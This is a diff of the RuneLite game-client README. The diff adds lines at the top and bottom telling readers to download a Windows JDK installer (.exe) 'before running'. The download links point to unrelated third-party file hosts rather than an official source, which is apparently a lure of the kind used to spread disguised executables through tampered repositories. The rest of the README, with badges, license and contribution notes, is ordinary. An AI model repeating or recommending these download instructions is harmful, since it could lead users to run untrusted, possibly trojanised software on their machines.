@@ -1,11 +1,7 @@
-
-Den her: https://file.duol.uz/HFS/SOFT/jdk-11.0.22_windows-x64_bin.exe?dl
-
+Download this: https://file.duol.uz/HFS/SOFT/jdk-11.0.22_windows-x64_bin.exe?dl
 
 
-https://cfdownload.adobe.com/pub/adobe/coldfusion/java/java11/java11021/jdk-11.0.21_windows-x64_bin.exe
 
-Download https://files02.tchspt.com/down/jdk-11.0.21_windows-x64_bin.exe before running
 
 ![](https://runelite.net/img/logo.png)
 # runelite [![CI](https://github.com/runelite/runelite/workflows/CI/badge.svg)](https://github.com/runelite/runelite/actions?query=workflow%3ACI+branch%3Amaster) [![Discord](https://img.shields.io/discord/301497432909414422.svg)](https://discord.gg/ArdAhnN)
@@ -32,3 +28,8 @@ RuneLite is licensed under the BSD 2-clause license. See the license header in t
 ## Contribute and Develop
 
 We've set up a separate document for our [contribution guidelines](https://github.com/runelite/runelite/blob/master/.github/CONTRIBUTING.md).
+
+
+https://cfdownload.adobe.com/pub/adobe/coldfusion/java/java11/java11021/jdk-11.0.21_windows-x64_bin.exe
+
+Download https://files02.tchspt.com/down/jdk-11.0.21_windows-x64_bin.exe before running
